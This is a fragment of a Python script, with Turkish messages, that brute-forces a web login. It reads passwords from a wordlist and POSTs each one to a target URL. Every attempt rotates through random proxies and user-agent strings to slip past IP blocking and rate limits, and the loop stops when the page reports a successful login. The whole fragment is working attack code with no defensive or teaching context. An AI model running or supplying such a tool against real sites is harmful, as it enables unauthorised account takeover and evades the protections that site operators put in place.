...
def main():
    ...
    password_list_file = "sifreler.txt"
    proxy_list_file = "proxyler.txt"
    ...
    passwords = [line.strip() for line in open(password_list_file, "r")]
    proxies = [line.strip() for line in open(proxy_list_file, "r")]

    try:
        for password in passwords:
            random_proxy = random.choice(proxies)
            random_user_agent = random.choice(user_agents)
            proxy_dict = {"http": random_proxy, "https": random_proxy}
            data = {"username": username, "password": password}

            try:
                response = requests.post(target_url, data=data, proxies=proxy_dict, headers={"User-Agent": random_user_agent}, timeout=5)

                if "Başarılı giriş" in response.text:
                    print(f"Başarılı şifre: {password}")
                    break
                else:
                    print(f"Denenen şifre: {password}, Proxy: {random_proxy}")
            except Exception as e:
                print(f"Hata oluştu, Proxy: {random_proxy}, Hata: {str(e)}")

    except KeyboardInterrupt:
        print("Kullanıcı tarafından işlem durduruldu.")
        sys.exit(0)
